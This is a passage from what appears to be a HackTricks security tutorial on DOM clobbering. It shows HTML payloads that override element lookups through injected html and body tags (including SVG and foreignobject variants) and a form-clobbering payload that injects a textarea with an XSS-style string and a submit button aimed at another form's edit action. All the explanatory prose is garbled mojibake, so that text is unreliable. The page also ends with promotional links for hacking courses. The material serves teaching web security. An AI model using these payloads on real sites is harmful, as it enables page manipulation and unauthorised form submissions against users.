**`document.getElementById()`** ‡§î‡§∞ **`document.querySelector()`** ‡§ï‡•á ‡§ï‡•â‡§≤ ‡§ï‡•á ‡§™‡§∞‡§ø‡§£‡§æ‡§Æ‡•ã‡§Ç ‡§ï‡•ã ‡§è‡§ï ‡§∏‡§Æ‡§æ‡§® id ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• `<html>` ‡§Ø‡§æ `<body>` ‡§ü‡•à‡§ó ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡§∞‡§ï‡•á ‡§¨‡§¶‡§≤‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡•á ‡§á‡§∏ ‡§§‡§∞‡§π ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§á‡§® ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§ü‡•á‡§° HTML/body ‡§ü‡•à‡§ó‡•ç‡§∏ ‡§ï‡•ã ‡§õ‡§ø‡§™‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∂‡•à‡§≤‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á, `innerText` ‡§Æ‡•á‡§Ç ‡§Ö‡§®‡•ç‡§Ø ‡§™‡§æ‡§† ‡§∏‡•á ‡§π‡§∏‡•ç‡§§‡§ï‡•ç‡§∑‡•á‡§™ ‡§ï‡•ã ‡§∞‡•ã‡§ï‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§π‡§Æ‡§≤‡•á ‡§ï‡•Ä ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡§∂‡•Ä‡§≤‡§§‡§æ ‡§ï‡•ã ‡§¨‡§¢‡§º‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
SVG ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§∏‡•á ‡§™‡§§‡§æ ‡§ö‡§≤‡§æ ‡§ï‡§ø `<body>` ‡§ü‡•à‡§ó ‡§ï‡•ã ‡§≠‡•Ä ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä ‡§¢‡§Ç‡§ó ‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
SVG ‡§Æ‡•á‡§Ç ‡§¨‡•ç‡§∞‡§æ‡§â‡§ú‡§º‡§∞‡•ã‡§Ç ‡§ú‡•à‡§∏‡•á Chrome ‡§î‡§∞ Firefox ‡§Æ‡•á‡§Ç HTML ‡§ü‡•à‡§ó ‡§ï‡•á ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§è‡§ï `<foreignobject>` ‡§ü‡•à‡§ó ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Clobbering Forms

‡§Ø‡§π ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™ **‡§ï‡§ø‡§∏‡•Ä ‡§´‡•â‡§∞‡•ç‡§Æ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§®‡§è ‡§™‡•ç‡§∞‡§µ‡§ø‡§∑‡•ç‡§ü‡§ø‡§Ø‡§æ‡§Å ‡§ú‡•ã‡§°‡§º‡•á‡§Ç** ‡§ï‡•á‡§µ‡§≤ **‡§ï‡•Å‡§õ ‡§ü‡•à‡§ó‡•ç‡§∏ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ `form` ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ ‡§ï‡•ã ‡§®‡§ø‡§∞‡•ç‡§¶‡§ø‡§∑‡•ç‡§ü ‡§ï‡§∞‡§ï‡•á**‡•§ ‡§Ü‡§™ ‡§á‡§∏‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó **‡§´‡•â‡§∞‡•ç‡§Æ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§®‡§è ‡§Æ‡§æ‡§® ‡§ú‡•ã‡§°‡§º‡§®‡•á** ‡§î‡§∞ ‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§ï‡§ø ‡§è‡§ï ‡§®‡§Ø‡§æ **‡§¨‡§ü‡§®** ‡§ú‡•ã‡§°‡§º‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç **‡§á‡§∏‡•á ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è** (‡§ï‡•ç‡§≤‡§ø‡§ï‡§ú‡•à‡§ï‡§ø‡§Ç‡§ó ‡§Ø‡§æ ‡§ï‡•Å‡§õ `.click()` JS ‡§ï‡•ã‡§° ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* ‡§Ö‡§ß‡§ø‡§ï ‡§´‡§º‡•â‡§∞‡•ç‡§Æ ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è [**‡§¨‡§ü‡§® ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡•á‡§Ç**](https://www.w3schools.com/tags/tag\_button.asp)**‡•§**

## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* ‡§π‡•á‡§Ø‡§∏, ‡§ó‡•à‡§∞‡•á‡§•‡•§ ‡§π‡•à‡§ï‡§∞‡•ç‡§∏ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ú‡§æ‡§µ‡§æ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü: ‡§è‡§ï ‡§π‡•à‡§ï‡§∞ ‡§ï‡•Ä ‡§§‡§∞‡§π ‡§∏‡•ã‡§ö‡§®‡§æ ‡§∏‡•Ä‡§ñ‡•á‡§Ç‡•§

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§ì‡§Ç**](https://github.com/sponsors/carlospolop) ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡•á‡§Ç!
* **‡§π‡§Æ‡§æ‡§∞‡•á** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **‡§π‡§Æ‡§æ‡§∞‡•á** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ‡§ï‡§æ ‡§™‡§æ‡§≤‡§® ‡§ï‡§∞‡•á‡§Ç‡•§**
* ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
